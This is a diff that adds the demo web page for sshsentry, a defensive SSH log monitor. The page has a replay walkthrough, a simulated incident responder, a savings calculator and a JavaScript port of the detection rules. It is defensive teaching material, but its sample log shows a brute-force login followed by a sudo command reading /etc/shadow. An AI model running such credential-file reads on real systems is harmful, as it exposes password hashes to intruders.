@@ -1,0 +1,796 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>sshsentry: plain-English SSH alerts for small servers (live demo)</title>
+<style>
+  :root { --bg:#0f1419; --panel:#161d24; --fg:#e6e6e6; --muted:#9aa5b1; --acc:#4fb3ff; --line:#2a333d;
+          --LOW:#8fd18f; --MEDIUM:#ffcc66; --HIGH:#ff8a5c; --CRITICAL:#ff4d6d; }
+  * { box-sizing:border-box; }
+  body { margin:0; font:15px/1.45 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif; background:var(--bg); color:var(--fg); }
+  header, main, footer { max-width:1100px; margin:0 auto; padding:0 18px; }
+  header { padding-top:22px; }
+  h1 { margin:0 0 4px; font-size:24px; } h1 span { color:var(--acc); }
+  h2 { font-size:16px; margin:0 0 8px; color:var(--acc); }
+  .note { background:#1d2630; border-left:3px solid var(--acc); padding:8px 12px; margin:12px 0; color:var(--muted); font-size:14px; }
+  .grid { display:grid; grid-template-columns: 1fr 1fr; gap:14px; }
+  @media (max-width:860px) { .grid { grid-template-columns:1fr; } }
+  section { background:var(--panel); border:1px solid var(--line); border-radius:8px; padding:12px 14px; margin:12px 0; }
+  textarea { width:100%; min-height:220px; background:#0b0f13; color:var(--fg); border:1px solid var(--line); border-radius:6px;
+             font:12px/1.4 ui-monospace,Menlo,Consolas,monospace; padding:8px; resize:vertical; }
+  pre { white-space:pre-wrap; word-break:break-word; font:12.5px/1.45 ui-monospace,Menlo,Consolas,monospace; margin:0; }
+  .controls, .calc-controls { display:grid; grid-template-columns: repeat(auto-fill, minmax(340px,1fr)); gap:6px 14px; font-size:14px; }
+  .controls label, .calc-controls label { display:flex; justify-content:space-between; align-items:center; gap:8px; }
+  input[type=number] { width:70px; background:#0b0f13; color:var(--fg); border:1px solid var(--line); border-radius:4px; padding:2px 4px; }
+  button { background:var(--acc); color:#04121f; border:0; border-radius:6px; padding:7px 14px; font-weight:600; cursor:pointer; }
+  button.secondary { background:#2a333d; color:var(--fg); }
+  .row { display:flex; gap:8px; flex-wrap:wrap; align-items:center; margin-top:8px; }
+  .stats { display:flex; gap:10px; flex-wrap:wrap; margin-bottom:8px; }
+  .stat { background:#0b0f13; border:1px solid var(--line); border-radius:6px; padding:6px 10px; font-size:13px; }
+  .stat b { font-size:18px; display:block; }
+  .alert { border-left:4px solid; padding:4px 8px; margin:0 0 6px; background:#0b0f13; border-radius:3px; }
+  .sev { font-weight:700; }
+  .note.warn { border-left-color:var(--HIGH, #f0883e); }
+  .disclaimer p { margin:0 0 8px; font-size:14px; color:var(--muted); }
+  .disclaimer p:last-child { margin-bottom:0; }
+  footer { color:var(--muted); font-size:13px; padding-bottom:30px; }
+  a { color:var(--acc); }
+  input[type=number].wide { width:90px; }
+  select { background:#0b0f13; color:var(--fg); border:1px solid var(--line); border-radius:4px; padding:2px 4px; }
+  table.calc { width:100%; border-collapse:collapse; font-size:14px; margin-top:10px; }
+  table.calc th, table.calc td { border-bottom:1px solid var(--line); padding:6px 8px; text-align:right; }
+  table.calc th:first-child, table.calc td:first-child { text-align:left; }
+  table.calc tr.lead td { font-weight:700; color:var(--LOW); }
+  table.calc tr.total td { font-weight:700; }
+  .tag { font-size:11px; color:var(--MEDIUM); border:1px solid var(--MEDIUM); border-radius:3px; padding:0 4px; margin-left:4px; }
+  details { margin-top:10px; font-size:13.5px; color:var(--muted); }
+  details summary { cursor:pointer; color:var(--acc); }
+  details li { margin:3px 0; }
+  .hero { padding:34px 0 10px; }
+  .hero h1 { font-size:32px; line-height:1.2; margin:0 0 10px; }
+  .hero p.pitch { font-size:18px; max-width:760px; margin:0 0 10px; }
+  .hero .sub { color:var(--muted); font-size:14px; }
+  .wt { display:grid; grid-template-columns: 1fr 1fr; gap:14px; }
+  @media (max-width:860px) { .wt { grid-template-columns:1fr; } }
+  .pane { background:#0b0f13; border:1px solid var(--line); border-radius:6px; padding:8px; height:360px; overflow:auto; }
+  .pane h3 { position:sticky; top:-8px; background:#0b0f13; padding:4px 0; z-index:1; margin:0 0 6px; font-size:13px; color:var(--muted); font-weight:600; text-transform:uppercase; letter-spacing:.04em; }
+  .logline { font:12px/1.5 ui-monospace,Menlo,Consolas,monospace; white-space:pre-wrap; word-break:break-all; color:var(--muted); }
+  .logline.fail { color:var(--MEDIUM); } .logline.ok { color:var(--LOW); } .logline.cur { background:#1d2630; }
+  .todo { margin-top:4px; font-size:13px; color:var(--fg); } .todo b { color:var(--acc); }
+  .cards { display:grid; grid-template-columns: repeat(auto-fill, minmax(240px,1fr)); gap:10px; }
+  .card { background:#0b0f13; border:1px solid var(--line); border-radius:6px; padding:10px 12px; font-size:14px; }
+  .card h3 { margin:0 0 4px; font-size:14.5px; color:var(--fg); }
+  .card p { margin:0; color:var(--muted); }
+  .deemph { opacity:.35; text-decoration:line-through; }
+  details.foot > summary { font-size:14.5px; }
+  button:disabled { opacity:.5; cursor:default; }
+  button:focus-visible, select:focus-visible, input:focus-visible, summary:focus-visible, .pane:focus-visible { outline:2px solid var(--acc); outline-offset:2px; }
+  @media (prefers-reduced-motion: reduce) { * { scroll-behavior:auto !important; transition:none !important; } }
+  .term { background:#05080b; border:1px solid var(--line); border-radius:6px; padding:10px; max-height:340px; overflow:auto;
+          font:12.5px/1.5 ui-monospace,Menlo,Consolas,monospace; color:#cfd8dc; white-space:pre-wrap; }
+  .term .cmd { color:var(--acc); } .term .ok { color:var(--LOW); } .term .skip { color:var(--muted); } .term .warn { color:var(--MEDIUM); }
+  .term .bad { color:var(--CRITICAL); }
+  .rs-prompt { display:flex; gap:8px; align-items:center; flex-wrap:wrap; margin-top:8px; background:#1d2630; border-left:3px solid var(--MEDIUM);
+               padding:8px 10px; border-radius:4px; }
+  .rs-q { font:13px ui-monospace,Menlo,Consolas,monospace; font-weight:700; }
+  table.rs { width:100%; border-collapse:collapse; font-size:13.5px; margin:8px 0; }
+  table.rs th, table.rs td { border-bottom:1px solid var(--line); padding:5px 8px; text-align:left; vertical-align:top; }
+  .lbl { font-size:11.5px; font-weight:700; border-radius:3px; padding:1px 5px; white-space:nowrap; }
+  .lbl.expected { color:var(--LOW); border:1px solid var(--LOW); } .lbl.unexplained { color:var(--CRITICAL); border:1px solid var(--CRITICAL); }
+  .lbl.cant { color:var(--MEDIUM); border:1px solid var(--MEDIUM); }
+  .verdict { margin-top:10px; padding:10px 12px; border-radius:6px; background:#0b0f13; border:1px solid var(--line); border-left:4px solid; }
+[hidden]{display:none!important}
+</style>
+</head>
+<body>
+<header class="hero">
+  <h1><span>sshsentry</span>: know when someone is trying to break into your server</h1>
+  <p class="pitch">For small business owners and indie operators without a security team: sshsentry reads your SSH logs for you
+  and tells you in plain English what happened and what to do.</p>
+  <div class="sub">Free and open source. One Python script on your server. This page is a live, in-browser demo, and nothing you
+  paste leaves this tab.</div>
+</header>
+<main>
+  <section id="walkthrough" aria-labelledby="wt-title">
+    <h2 id="wt-title">Watch it catch an attack</h2>
+    <p style="margin:0 0 8px;color:var(--muted);font-size:14px">A server log replays line by line below. This is the bundled sample
+    log: one attacker guesses passwords, another guesses until they get in. The alerts are generated live by the demo engine as each
+    line arrives (the same engine as the "Try it on your own log" tool, with escalation on), followed by the daily digest.</p>
+    <div class="row" role="group" aria-label="Walkthrough controls" style="margin:0 0 10px">
+      <button id="wt-play" type="button" aria-pressed="false">Play</button>
+      <button id="wt-step" type="button" class="secondary">Step</button>
+      <button id="wt-restart" type="button" class="secondary">Restart</button>
+      <label style="font-size:14px">Speed <select id="wt-speed">
+        <option value="0.5">0.5&times;</option><option value="1" selected>1&times;</option>
+        <option value="2">2&times;</option><option value="4">4&times;</option></select></label>
+      <span id="wt-progress" style="color:var(--muted);font-size:13px"></span>
+    </div>
+    <div class="wt">
+      <div class="pane" id="wt-logpane" tabindex="0" role="region" aria-label="Server log"><h3>Server log (/var/log/auth.log)</h3><div id="wt-log"></div></div>
+      <div class="pane" id="wt-alertpane" tabindex="0" role="region" aria-label="sshsentry alerts"><h3>sshsentry alerts</h3>
+        <div id="wt-alerts" role="log" aria-live="polite" aria-relevant="additions"></div>
+        <div id="wt-digestbox" hidden><h3 style="margin-top:10px">Next morning: daily digest</h3><pre id="wt-digest" aria-live="polite"></pre></div>
+      </div>
+    </div>
+    <div id="responder" hidden aria-labelledby="rs-title">
+      <h3 id="rs-title" style="margin:14px 0 6px;font-size:15px;color:var(--CRITICAL)">Next: respond to the break-in. <code>sshsentry --respond <span id="rs-ip">IP</span></code></h3>
+      <div class="note" style="margin-top:0"><b>Simulation: the responder is specified but not yet in the Python tool.</b> This shows how it is
+        planned to work, and nothing runs on any real server. Each step is a question. Answering No (the default) skips that step.</div>
+      <div class="note warn" id="rs-real" style="margin-top:0"><b>In real use, these steps change your server. Read each one before approving.</b></div>
+      <div class="row" style="margin:0 0 8px">
+        <label style="font-size:14px">Scenario (controls what the checks find) <select id="rs-scenario">
+          <option value="clean">Clean</option>
+          <option value="unexplained" selected>Unexplained changes</option>
+          <option value="data">Customer data or edited logs</option></select></label>
+        <label style="font-size:14px"><input type="checkbox" id="rs-preblocked"> IP was already blocked</label>
+        <button id="rs-again" type="button" class="secondary" disabled>Run again (same answers)</button>
+      </div>
+      <pre id="rs-term" class="term" role="log" aria-live="polite" aria-label="Simulated responder terminal" tabindex="0"></pre>
+      <div id="rs-prompt" class="rs-prompt" role="group" aria-labelledby="rs-q" hidden>
+        <span id="rs-q" class="rs-q"></span>
+        <button id="rs-yes" type="button">Yes (y)</button>
+        <button id="rs-no" type="button" class="secondary">No (n or Enter)</button>
+      </div>
+      <div id="rs-report" aria-live="polite" hidden></div>
+    </div>
+  </section>
+  <section id="features" aria-labelledby="ft-title">
+    <h2 id="ft-title">What it does</h2>
+    <div class="cards">
+      <div class="card"><h3>Plain-English alerts</h3><p>Brute force, logins after failed attempts, new IPs or countries, and new users or SSH keys. Sent to stdout, email, Slack or a webhook, with a CRITICAL escalation when an attacker gets in.</p></div>
+      <div class="card"><h3>Daily digest</h3><p>One short screen each morning, sent even on quiet days ("No incidents today"). Kept locally in SQLite and as text files.</p></div>
+      <div class="card"><h3>JSON output</h3><p><code>--format json</code> for digests, threshold suggestions, sharing history, exports and verification, with a versioned <code>schema</code> field.</p></div>
+      <div class="card"><h3>Verifiable exports</h3><p><code>--export-digests</code> makes a zip for your records or an auditor. <code>--verify-export</code> and <code>--verify-chain</code> report PASS or FAIL and name the day that broke.</p></div>
+      <div class="card"><h3>Hash chaining</h3><p>Each digest's hash covers the previous one, and the chain hash is printed in every emailed digest. Tamper-evident, not tamper-proof.</p></div>
+      <div class="card"><h3>Learn mode</h3><p>Watches quietly for a few days, then suggests a brute-force threshold based on your own traffic. Off by default.</p></div>
+    </div>
+    <p style="margin:10px 0 0;color:var(--muted);font-size:13.5px">sshsentry detects and alerts. It doesn't block anything, so pair it with fail2ban, a firewall and key-only SSH.</p>
+  </section>
+  <section id="try" aria-labelledby="try-title" style="background:transparent;border:0;padding:0">
+    <h2 id="try-title" style="font-size:18px;margin-top:18px">Try it on your own log</h2>
+  <div class="note" style="margin-top:0">This is a <b>demo port</b> of sshsentry's detection logic, written in JavaScript so it runs entirely in your
+  browser. Nothing is uploaded: there is no backend and no external script. The real tool is a single Python script
+  (<code>sshsentry.py</code>); this page reproduces its <code>--replay sample-auth.log --digest-now</code> output for the four
+  log rules, brute-force escalation and the daily digest. Not ported: GeoIP country lookups, the
+  <code>/etc/passwd</code> and <code>authorized_keys</code> checks, SQLite state, alert delivery and sharing.</div>
+  <section>
+    <h2>1. A log</h2>
+    <textarea id="log" spellcheck="false" aria-label="auth.log contents"></textarea>
+    <div class="row">
+      <button class="secondary" id="sample">Load sample log</button>
+      <label class="secondary"><input type="file" id="file" accept=".log,.txt,text/plain"> load your own auth.log</label>
+      <span style="color:var(--muted);font-size:13px">Or paste lines from <code>/var/log/auth.log</code> or <code>/var/log/secure</code>. It stays in this tab.</span>
+    </div>
+  </section>
+  <section>
+    <h2>2. Thresholds (same keys as sshsentry.yaml)</h2>
+    <div class="controls">
+      <label>rules.brute_force.failures <input type="number" id="bf_failures" min="1" value="5"></label>
+      <label>rules.brute_force.window_minutes <input type="number" id="bf_window" min="1" value="10"></label>
+      <label>rules.login_after_failures.failures <input type="number" id="laf_failures" min="1" value="5"></label>
+      <label>rules.login_after_failures.lookback_minutes <input type="number" id="laf_lookback" min="1" value="60"></label>
+      <label>cooldown_minutes <input type="number" id="cooldown" min="0" value="60"></label>
+      <label>rules.new_ip.enabled <input type="checkbox" id="new_ip" checked></label>
+      <label title="Escalation applies when alerting is enabled">alerting.enabled (escalation) <input type="checkbox" id="escalation"></label>
+      <label>learn_mode.enabled <input type="checkbox" id="learn"></label>
+    </div>
+    <div class="row"><button id="run">Run replay</button>
+      <span style="color:var(--muted);font-size:13px">Equivalent to <code>python3 sshsentry.py --replay your.log --digest-now</code></span></div>
+  </section>
+  <div class="grid">
+    <section>
+      <h2>3. Alerts</h2>
+      <div class="stats" id="stats"></div>
+      <div id="alerts"></div>
+    </section>
+    <section>
+      <h2>4. Daily digest</h2>
+      <pre id="digest"></pre>
+    </section>
+  </div>
+  </section>
+  <section id="disclaimer" class="disclaimer" aria-labelledby="disc-title">
+    <h2 id="disc-title">Disclaimer</h2>
+    <p>sshsentry helps you notice and respond to suspicious logins. It can't guarantee your server is secure or stop every break-in.</p>
+    <p>The responder runs real, destructive commands on your server: it locks accounts, blocks IPs, and rotates passwords and keys. You're responsible for every step you approve, so read each one before you say yes. When it says no unexplained changes were found, that doesn't prove your server is clean.</p>
+    <p>If an incident involves customer data, legal duties, or anything you can't explain, get a professional. If you have cyber insurance, call your insurer's hotline before you hire anyone.</p>
+    <p>sshsentry is provided as-is under the MIT license, with no warranty of any kind.</p>
+  </section>
+  <section id="savings-foot">
+    <details class="foot" id="savings">
+      <summary>Footnote: savings calculator (time saved and a breach-risk estimate)</summary>
+  <section id="calculator" style="background:transparent;border:0;padding:0;margin:0">
+    <h2 style="margin-top:8px">Time first, then risk (estimates)</h2>
+    <p>sshsentry's most concrete value is <b>time</b>. You read a short, plain-English digest instead of digging through auth logs.
+    At a median sysadmin's loaded cost (about $68/hr), that's roughly <b>9 to 20 hours and $600 to $1,400 per server per year</b>,
+    <i>if someone reviews logs by hand today</i>. If nobody does, sshsentry saves no time; what you get is visibility you don't have now.</p>
+    <p style="color:var(--muted)">Second, and with care: the <b>estimated avoided breach cost</b> is about $1 to $4,700 a year
+    per organization, depending on how cautious the assumptions are. That range comes from insurer claims data (Coalition, Verizon),
+    Verizon's breach-vector data and IBM's small-business breach cost, multiplied by our own <i>assumed</i> effect of earlier detection.
+    These are estimates, not guarantees. sshsentry detects and alerts; it does not block attacks or prevent breaches, and SSH is only
+    one way in. Pair it with key-only auth, patching and fail2ban.</p>
+    <div class="calc-controls">
+      <label>Servers <input type="number" class="wide" id="c_servers" min="0" step="1" value="1"></label>
+      <label>Failed login attempts per server per day <input type="number" class="wide" id="c_attempts" min="0" step="1" value="500"></label>
+      <label>Admin hourly rate ($) <input type="number" class="wide" id="c_rate" min="0" step="0.01" value="47.66"></label>
+      <label>That rate is <select id="c_ratetype">
+        <option value="wage" selected>a base wage (we add overhead: &divide; 0.70)</option>
+        <option value="loaded">already loaded, or an MSP rate (used as is)</option></select></label>
+      <label>Does someone review logs by hand today? <select id="c_review">
+        <option value="yes" selected>Yes</option><option value="no">No</option></select></label>
+      <label>Subscription price ($ per server per month) <input type="number" class="wide" id="c_price" min="0" step="0.01" value="3"></label>
+    </div>
+    <div id="c_rate_note" style="color:var(--muted);font-size:13px;margin-top:6px"></div>
+    <table class="calc" aria-label="Estimated annual savings">
+      <thead><tr><th></th><th>Cautious</th><th id="c_agg_head">Aggressive</th></tr></thead>
+      <tbody>
+        <tr class="lead"><td>Admin hours saved per year</td><td id="c_h_c"></td><td id="c_h_a"></td></tr>
+        <tr class="lead"><td>Value of that time</td><td id="c_l_c"></td><td id="c_l_a"></td></tr>
+        <tr><td>Avoided-breach cost <span class="tag">ESTIMATE</span><br><span style="font-size:12px;color:var(--muted)">per organization, not per server; see assumptions below</span></td><td id="c_e_c"></td><td id="c_e_a"></td></tr>
+        <tr class="total"><td>Total estimated value per year</td><td id="c_t_c"></td><td id="c_t_a"></td></tr>
+        <tr><td>Subscription per year</td><td id="c_s_c"></td><td id="c_s_a"></td></tr>
+        <tr><td>Payback period</td><td id="c_p_c"></td><td id="c_p_a"></td></tr>
+      </tbody>
+    </table>
+    <div id="c_noreview" class="note" hidden>You said nobody reviews logs by hand today, so time saved is <b>0</b>, because there is no manual work to
+      replace. What's left is the breach-risk estimate, which is small and uncertain. The aggressive breach, total and payback figures
+      are struck through: without a manual-review baseline they come only from the $3.31M average, so don't rely on them. Choose
+      sshsentry for visibility, not for these numbers.</div>
+    <details>
+      <summary>How we calculate this (every assumption and source)</summary>
+      <ul>
+        <li><b>Loaded rate</b> = base wage &divide; 0.70, because wages are 70.0% of total compensation (BLS ECEC, June 2026). A loaded or MSP rate is used as is. The default wage of $47.66/hr is the BLS OEWS May 2025 median for Network &amp; Computer Systems Administrators, which gives $68.09/hr loaded.</li>
+        <li><b>Volume factor</b> (assumption A3): v = 1 + 0.1 &times; log10(1 + attempts per day). Busier logs take a little longer to read, but only a little.</li>
+        <li><b>Manual review time</b> (assumption A1): 10 min per server per week (cautious) or 20 (aggressive), times v. This is replaced by a <b>2-minute digest read per server per week</b>. No published SSH-triage benchmark exists.</li>
+        <li><b>Hours saved per year</b> = servers &times; 52 &times; max(0, minutes &times; v &minus; 2) &divide; 60. If nobody reviews logs by hand today, the minutes are 0, so hours and time value are 0.</li>
+        <li><b>Value of time</b> = hours saved &times; loaded rate.</li>
+        <li><b>Avoided-breach estimate</b> = P &times; S &times; D &times; C, per organization per year:
+          <ul>
+            <li>P = 1.21% annual claim probability (Coalition 2026 Claims Report, businesses under $25M revenue; taken from a search summary, not read directly).</li>
+            <li>S = share of breaches through the SSH/credential vector. Cautious: 13% (Verizon DBIR 2026, credential abuse as the initial entry vector) &times; 25% assumed to be SSH (assumption A2) = 3.25%. Aggressive: 39% (DBIR 2026, credential abuse anywhere in the breach chain).</li>
+            <li>D = risk reduction from earlier detection (assumption A4, no source): 10% cautious, 30% aggressive. Detection shortens how long an attacker goes unnoticed; it does not prevent compromise.</li>
+            <li>C = breach cost. Cautious: $38,000 (Verizon 2026 Breach Impact Study, median SMB insured loss). Aggressive: $3.31M (IBM Cost of a Data Breach 2023, average for organizations with fewer than 500 employees, which includes lost business). The two differ by about 90&times;, so don't read the aggressive figure as a typical loss.</li>
+            <li>Result: about $1.49 per year (cautious) to $4,686 per year (aggressive).</li>
+          </ul></li>
+        <li><b>Subscription</b> = price &times; 12 &times; servers. sshsentry itself is free and open source (MIT). The $3/server/month default is a <i>hypothetical</i> premium-tier price (assumption A5).</li>
+        <li><b>Payback (months)</b> = 12 &times; subscription per year &divide; total value per year.</li>
+        <li><b>Sources:</b>
+          <ul>
+            <li>IBM Cost of a Data Breach 2023 (SMB, &lt;500 employees: $3.31M)</li>
+            <li>Verizon DBIR 2026 (credential abuse: 13% initial entry, 39% anywhere in the chain)</li>
+            <li>Verizon 2026 Breach Impact Study (SMB median: $38K)</li>
+            <li>Coalition 2026 Claims Report (1.21%)</li>
+            <li>BLS OEWS May 2025 ($47.66/hr median)</li>
+            <li>BLS ECEC June 2026 (wages are 70% of compensation)</li>
+          </ul>
+          Full citations are in <code>sshsentry-financial-analysis.md</code>.</li>
+      </ul>
+    </details>
+  </section>
+    </details>
+  </section>
+  <pre id="result" hidden></pre>
+  <pre id="calc-result" hidden></pre>
+  <pre id="walk-result" hidden></pre>
+  <pre id="resp-result" hidden></pre>
+</main>
+<footer>
+  sshsentry is free and open source. Install: copy <code>sshsentry.py</code> and <code>sshsentry.yaml</code> to the server,
+  <code>pip install pyyaml</code>, then run <code>sudo python3 sshsentry.py --replay sample-auth.log</code>.
+  The Python script is the reference, so if the two ever disagree, trust the Python output.
+  Contact: <a href="mailto:sshsentry@gmail.com">sshsentry@gmail.com</a>. Report security issues privately to <a href="mailto:sshsentry@gmail.com">sshsentry@gmail.com</a>.
+</footer>
+<script>
+"use strict";
+const SAMPLE = "Oct 17 01:58:02 web01 sshd[2101]: Accepted publickey for chris from 198.51.100.23 port 51422 ssh2: ED25519 SHA256:q3Vd9mXc1Yt0Lz8Kp2Rb7sNf4Hj6Ww5Ee1Aa9Bb0Cc\nOct 17 01:58:02 web01 sshd[2101]: pam_unix(sshd:session): session opened for user chris(uid=1000) by (uid=0)\nOct 17 02:03:11 web01 CRON[2210]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)\nOct 17 02:10:01 web01 sshd[2301]: Invalid user admin from 203.0.113.45 port 40112\nOct 17 02:10:03 web01 sshd[2301]: Failed password for invalid user admin from 203.0.113.45 port 40112 ssh2\nOct 17 02:10:09 web01 sshd[2303]: Failed password for root from 203.0.113.45 port 40118 ssh2\nOct 17 02:10:15 web01 sshd[2305]: Invalid user test from 203.0.113.45 port 40124\nOct 17 02:10:17 web01 sshd[2305]: Failed password for invalid user test from 203.0.113.45 port 40124 ssh2\nOct 17 02:10:24 web01 sshd[2307]: Failed password for root from 203.0.113.45 port 40130 ssh2\nOct 17 02:10:31 web01 sshd[2309]: Invalid user oracle from 203.0.113.45 port 40136\nOct 17 02:10:33 web01 sshd[2309]: Failed password for invalid user oracle from 203.0.113.45 port 40136 ssh2\nOct 17 02:10:40 web01 sshd[2311]: Failed password for root from 203.0.113.45 port 40142 ssh2\nOct 17 02:10:41 web01 sshd[2311]: Connection closed by authenticating user root 203.0.113.45 port 40142 [preauth]\nOct 17 02:14:52 web01 sshd[2340]: Failed password for deploy from 192.0.2.77 port 55010 ssh2\nOct 17 02:15:04 web01 sshd[2342]: Failed password for deploy from 192.0.2.77 port 55016 ssh2\nOct 17 02:15:17 web01 sshd[2344]: Failed password for deploy from 192.0.2.77 port 55022 ssh2\nOct 17 02:15:29 web01 sshd[2346]: Failed password for deploy from 192.0.2.77 port 55030 ssh2\nOct 17 02:15:41 web01 sshd[2348]: Failed password for deploy from 192.0.2.77 port 55036 ssh2\nOct 17 02:15:55 web01 sshd[2350]: Failed password for deploy from 192.0.2.77 port 55042 ssh2\nOct 17 02:16:08 web01 sshd[2352]: Accepted password for deploy from 192.0.2.77 port 55048 ssh2\nOct 17 02:16:08 web01 sshd[2352]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)\nOct 17 02:31:40 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow\nOct 17 02:44:19 web01 sshd[2420]: Accepted publickey for chris from 198.51.100.23 port 51630 ssh2: ED25519 SHA256:q3Vd9mXc1Yt0Lz8Kp2Rb7sNf4Hj6Ww5Ee1Aa9Bb0Cc\nOct 17 02:47:33 web01 sshd[2455]: Accepted publickey for chris from 100.64.12.9 port 60211 ssh2: ED25519 SHA256:q3Vd9mXc1Yt0Lz8Kp2Rb7sNf4Hj6Ww5Ee1Aa9Bb0Cc\n";
+
+// ---------- parsing (ports LINE_RE / FAIL_RE / INVALID_RE / OK_RE from sshsentry.py) ----------
+const LINE_RE = /^([A-Z][a-z]{2}\s+\d{1,2} \d\d:\d\d:\d\d|\d{4}-\d\d-\d\dT\S+) \S+ ([\w.\-\/]+)(?:\[\d+\])?: (.*)$/;
+const IP = "([0-9a-fA-F:.]+)";
+const FAIL_RE = new RegExp("Failed (?:password|publickey|keyboard-interactive/pam) for (\\S+) from " + IP);
+const INVALID_RE = new RegExp("Invalid user (\\S*) from " + IP);
+const OK_RE = new RegExp("Accepted (\\S+) for (\\S+) from " + IP);
+const MON = {Jan:0,Feb:1,Mar:2,Apr:3,May:4,Jun:5,Jul:6,Aug:7,Sep:8,Oct:9,Nov:10,Dec:11};
+const DAYS = ["Sun","Mon","Tue","Wed","Thu","Fri","Sat"], MONS = Object.keys(MON);
+
+function parseTs(raw) {          // epoch seconds; syslog lines carry no year
+  if (/^\d/.test(raw)) { const t = Date.parse(raw); if (isNaN(t)) throw new Error("bad ts"); return t / 1000; }
+  const [mon, day, hms] = raw.split(/\s+/), [h, m, s] = hms.split(":").map(Number);
+  if (!(mon in MON)) throw new Error("bad ts");
+  const now = new Date();
+  let d = new Date(now.getFullYear(), MON[mon], Number(day), h, m, s);
+  if (d.getDate() !== Number(day)) throw new Error("bad ts");          // e.g. Feb 29 in a non-leap year
+  if (d.getTime() / 1000 > now.getTime() / 1000 + 86400) d = new Date(now.getFullYear() - 1, MON[mon], Number(day), h, m, s);
+  return d.getTime() / 1000;
+}
+const p2 = n => String(n).padStart(2, "0");
+function fmt(ts) { const d = new Date(ts * 1000);
+  return `${d.getFullYear()}-${p2(d.getMonth()+1)}-${p2(d.getDate())} ${p2(d.getHours())}:${p2(d.getMinutes())}:${p2(d.getSeconds())}`; }
+function fmtSpan(ts) { const d = new Date(ts * 1000);   // Python "%a %b %d %H:%M"
+  return `${DAYS[d.getDay()]} ${MONS[d.getMonth()]} ${p2(d.getDate())} ${p2(d.getHours())}:${p2(d.getMinutes())}`; }
+function roundHalfEven(x) { const f = Math.floor(x), r = x - f;   // Python round()
+  return r > 0.5 ? f + 1 : r < 0.5 ? f : (f % 2 === 0 ? f : f + 1); }
+const sortedSet = arr => [...new Set(arr)].sort((a, b) => a < b ? -1 : a > b ? 1 : 0);
+
+// ---------- the agent (in-memory port of the SQLite state) ----------
+function replay(text, cfg) {
+  const st = { failures: [], seenIps: [], alerts: new Map(), alertedIps: new Map(), logins: [], learn: new Map() };
+  const out = [];
+  const seenFor = (user, ip) => st.seenIps.some(r => r.user === user && (ip === undefined || r.ip === ip));
+  const countFails = (ip, lo, hi) => st.failures.filter(f => f.ip === ip && f.ts >= lo && f.ts <= hi);
+
+  function alert(severity, rule, key, ts, text) {
+    const k = rule + "\u0000" + key, last = st.alerts.get(k);
+    if (last !== undefined && Math.abs(ts - last) < cfg.cooldown * 60) return false;
+    st.alerts.set(k, ts);
+    // learn mode: alerts are printed marked "learning" and never sent (as in the Python tool)
+    out.push({ time: fmt(ts), severity, rule, message: text, learning: cfg.learn,
+               line: `${cfg.learn ? "[learning: not sent] " : ""}[${fmt(ts)}] ${severity}: ${text}` });
+    return true;
+  }
+  function onFailure(ip, user, ts) {
+    st.failures.push({ ip, user, ts });
+    st.failures = st.failures.filter(f => f.ts >= ts - 8 * 86400);
+    if (cfg.learn) { const w = cfg.bfWindow * 60, k = ip + "|" + Math.floor(ts / w) * w; st.learn.set(k, (st.learn.get(k) || 0) + 1); }
+    const rows = countFails(ip, ts - cfg.bfWindow * 60, ts);
+    if (rows.length >= cfg.bfFailures) {
+      const users = sortedSet(rows.map(r => r.user));
+      const span = ts - Math.min(...rows.map(r => r.ts));
+      const took = span < 120 ? `${Math.trunc(span)} sec` : `${roundHalfEven(span / 60)} min`;
+      const tried = users.slice(0, 8).map(u => u.slice(0, 64)).join(", ") + (users.length > 8 ? " ..." : "");
+      if (alert("MEDIUM", "brute_force", ip, ts,
+          `Brute force. ${rows.length} failed SSH logins from ${ip} in ${took}, trying user(s): ${tried}. ` +
+          "Consider fail2ban, a firewall block, or disabling password logins."))
+        st.alertedIps.set(ip, { ts, escalated: false });
+    }
+  }
+  function onSuccess(ip, user, method, ts) {
+    let lafEnabled = true;
+    const hit = st.alertedIps.get(ip);
+    if (hit && !hit.escalated && cfg.escalation) {
+      const fails = st.failures.filter(f => f.ip === ip && f.ts <= ts), tried = sortedSet(fails.map(f => f.user));
+      const text = `ESCALATION: successful login from ${ip} after brute force. User '${user}' logged in via ${method} ` +
+        `after ${fails.length} failed attempts from that IP (alerted at ${fmt(hit.ts)}; users tried: ` +
+        `${tried.slice(0, 8).map(u => u.slice(0, 64)).join(", ")}). Treat this as a likely compromise: lock the ` +
+        "account, check ~/.ssh/authorized_keys, review processes.";
+      if (alert("CRITICAL", "brute_force_success", ip, ts, text)) {
+        hit.escalated = true; st.alerts.set("login_after_failures\u0000" + user + "@" + ip, ts); lafEnabled = false;
+      }
+    }
+    if (lafEnabled) {
+      const n = countFails(ip, ts - cfg.lafLookback * 60, ts).length;
+      if (n >= cfg.lafFailures)
+        alert("HIGH", "login_after_failures", `${user}@${ip}`, ts,
+          `Login after failures. User '${user}' logged in via ${method} from ${ip} after ${n} failed attempts from ` +
+          "that IP. If this wasn't you, change the password, check ~/.ssh/authorized_keys and review running processes.");
+    }
+    const first = seenFor(user) ? "" : " (first recorded login)";
+    if (cfg.newIp && !seenFor(user, ip))
+      alert("LOW", "new_ip", `${user}@${ip}`, ts, `New IP login. User '${user}' logged in via ${method} from ${ip}, an ` +
+        `address never seen for this user${first}. If expected, approve it with: sshsentry.py --approve ${ip}`);
+    const before = countFails(ip, ts - cfg.lafLookback * 60, ts).length;
+    st.logins.push({ ts, user, ip, method, before });
+    st.logins = st.logins.filter(l => l.ts >= ts - 7 * 86400);
+    if (!seenFor(user, ip)) st.seenIps.push({ user, ip, first_seen: ts });
+  }
+  for (const raw of text.split(/\r?\n/)) {
+    const m = LINE_RE.exec(raw.trim());
+    if (!m || !m[2].startsWith("sshd")) continue;
+    let ts; try { ts = parseTs(m[1]); } catch (e) { continue; }
+    const msg = m[3], f = INVALID_RE.exec(msg) || FAIL_RE.exec(msg), ok = !f && OK_RE.exec(msg);
+    if (f) onFailure(f[2], f[1] || "(empty)", ts);
+    else if (ok) onSuccess(ok[3], ok[2], ok[1], ts);
+  }
+  return { alerts: out, state: st };
+}
+
+// ---------- learn-mode suggestion (port of suggestion_data) ----------
+function suggestion(st, cfg) {
